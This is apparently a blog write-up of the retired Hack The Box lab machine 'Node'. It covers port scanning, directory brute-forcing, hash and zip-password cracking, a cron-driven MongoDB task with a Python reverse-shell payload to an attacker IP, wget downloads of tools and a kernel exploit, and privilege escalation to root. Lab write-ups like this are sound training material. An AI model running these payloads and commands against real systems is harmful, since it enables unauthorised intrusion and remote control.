---
title: Node Hackthebox Writeup
date: 2021-01-26 01:00:00 +0900
categories: [Hackthebox, Retired]
tags: [linux,cronjobs,directory bruteforcing,kernel exploit,ssh]     # TAG names should always be lowercase
image: /assets/img/node-hackthebox/node-pic.png
subtitle: JHBDOcubeoveiubo
---


# Introduction@Node:~$


Column | Details
------------ | -------------
Name | Node
IP | 10.10.10.58
Points | 30
Os | Linux
Difficult | Medium
Creator | [g0blin](https://www.hackthebox.eu/home/users/profile/343)
Out on | 2th June 2017

# Summary:~$

* Discovering the new host and scanning for open ports.
* Detecting hidden directories `/api/users/` to find hash for the users.
* Cracking hash and downloading a backup file.
* Cracking password on the file to get the `SSH` password.
* Escalating privilges to another user by loging in `mongodb`.
* Exploited `Kernel Version` to gain Root.

## Nmap

Using `Nmap` to scan the host.

**Command**: *nmap -p- -sV -T4 -Pn 10.10.10.58*

___
![](/assets/img/node-hackthebox/nmap-scan-1.png)

Accessing port 3000, we get a website:

___
![](/assets/img/node-hackthebox/port-3000-2.png)

Using `dirbuster` on *http://10.10.10.58:3000/* to find hidden directories.

___
![](/assets/img/node-hackthebox/dirbuster-command-3.png)

**Wordlist Used**: *directory-list-2.3-medium.txt*

I looked for `SQL injections` on the *login* page, but it didn't work.

**Command Used**: *' or 1=1 --+*

___
![](/assets/img/node-hackthebox/login-page-4.png)

From `dirbuster` I found few directories and accessed this `http://10.10.10.58:3000/api/users/`

___
![](/assets/img/node-hackthebox/got-new-user-12.png)

These are the hashes which are given with each user, so I used [online hash cracking tool](https://hashes.com/en/decrypt/hash) to decode them.

* **tom**:`spongebob`
* **mark**:`snowflake`
* **myP14ceAdm1nAcc0uNT**:`manchester`

I tried loging in `SSH` first but didn't work, accessing login page for `mark`,`tom`.

___
![](/assets/img/node-hackthebox/loging-in-as-mark-11.png)

___
![](/assets/img/node-hackthebox/loging-in-as-tom-10.png)

Both of them are not `Admins`, Let's look into *myP14ceAdm1nAcc0uNT*.

___
![](/assets/img/node-hackthebox/loging-in-as-myplaceadminaccount-14.png)

Downloading `myplace.backup` file and opening it in *Geany Tool* for Kali Linux.

___
![](/assets/img/node-hackthebox/myplace.backup-file-15.png)

It looks like that the file is `base64` encoded, let's decode it first and then access it.

**Command Used**:*cat myplace.backup| base64 -d > backup.zip*

`backup.zip` requires a password.

___
![](/assets/img/node-hackthebox/decoded-backup-file-requires-password-16.png)

Using `fcrackzip` to crack the password.

**Command Used**: *fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt  backup.zip* (sudo apt-get install fcrackzip).

___
![](/assets/img/node-hackthebox/fcrackzip-password-found-17.png)

We got the password as `magicword`.

Now while accessing the `var` directory, I found a password for mark in `/var/www/myplace/app.js` as `5AYRft73VtFpc84k`.

___
![](/assets/img/node-hackthebox/got-mark-password-18.png)

`SSH` as mark.

___
![](/assets/img/node-hackthebox/ssh-loggedin-as-mark-19.png)

We don't have the permission to read the user flag, I used [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) and [pspy32](https://github.com/DominicBreuker/pspy/blob/master/README.md)

**Hosting Command**: *python3 -m http.server 8081*

**Downlaoding Command**: *wget http://10.10.X.X:8081/linpeas.sh*    (or *pspy32s*)

I executed `linpeas.sh` by giving it executing permission (*chmod +x linpeas.sh*)

___
![](/assets/img/node-hackthebox/mongodb-running-locally-25.png)

Here port `27017` is for *mongodb* which is running locally as *Tom*.

___
![](/assets/img/node-hackthebox/only-reading-permissions-24.png)

Loging into `mongodb`.

**Command Used**: *mongo -u mark -p 5AYRft73VtFpc84k localhost:27017/scheduler*

where *scheduler*: Database name.

___
![](/assets/img/node-hackthebox/loging-in-mongodb-26.png)

As shown above there is not any task running in `scheduler`, but it's a cronjob *(saw that in pspy32)* as Tom. Let's add our [reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and listen on the specifed port using `nc`.

**Payload**: *db.tasks.insert({cmd: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.X.X\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"})*

___
![](/assets/img/node-hackthebox/getting-reverse-shell-as-tom-27.png)

We got `User flag`.

For privilege escalation I looked for a kenerl exploit as it is outdated, found [this](https://www.exploit-db.com/exploits/45010)

___
![](/assets/img/node-hackthebox/kernel-exploit-29.png)

Transfered it to victim machine.

**Hosting Command**: *python3 -m http.server 8081*

**Downlaoding Command**: *wget http://10.10.X.X:8081/exploit.c*

Compiling it on the victim machine.

**Command**: *gcc exploit.c -o privesc*

I executed `privesc` by giving it executing permission (*chmod +x privesc*).

Stabling the [shell](https://netsec.ws/?p=337).

___
![](/assets/img/node-hackthebox/got-root-flag-32.png)

Got `Root`.





